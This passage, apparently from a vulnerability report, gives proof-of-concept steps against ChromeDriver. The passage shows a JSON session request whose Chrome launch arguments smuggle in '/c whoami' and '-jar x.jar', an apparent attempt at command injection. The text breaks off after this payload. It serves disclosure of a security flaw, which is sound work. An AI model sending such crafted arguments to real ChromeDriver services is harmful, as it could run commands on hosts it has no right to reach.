# Steps to reproduce the problem
## Proof of Concept

### 1. Observe the bypass via chrome://version

Start ChromeDriver locally and create a session:

```json
{
  "desiredCapabilities": {
    "browserName": "chrome",
    "goog:chromeOptions": {
      "args": ["/c whoami", "-jar x.jar"]
    }
  }
}
